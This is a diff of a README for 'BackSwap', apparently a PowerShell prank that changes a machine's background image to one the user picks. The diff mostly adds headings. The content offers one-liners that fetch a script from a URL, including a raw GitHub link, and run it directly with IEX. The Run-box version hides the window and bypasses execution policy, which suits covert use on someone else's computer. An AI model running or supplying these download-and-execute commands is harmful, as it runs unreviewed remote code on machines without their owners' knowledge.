@@ -1,6 +1,7 @@
-BackSwap
+# BackSwap
+Made by VBV11
 
-How to add ur own image
+# How to add ur own image
 
 Go to BS.ps1 and change the "UR OWN IMAGE URL"
 
@@ -9,7 +10,7 @@ Go to BS.ps1 and change the "UR OWN IMAGE URL"
 
 
 
-One line command in powershell
+# One line command in powershell
 
 (Change the URL to ur own URL of the code) powershell -command IEX(IWR URL)
 
@@ -20,7 +21,7 @@ powershell -command IEX(IWR https://raw.githubusercontent.com/VBV11/BackSwap/mai
 ![image](https://github.com/VBV11/BackSwap/assets/104235290/f632c341-f864-4334-8fa3-96970affdc9e)
 
 
-Run box command
+# Run box command
 
 (Change the URL to ur own URL of the code) powershell -w h -NoP -NonI -Exec Bypass $pl = iwr URL?dl=1; invoke-expression $pl
 
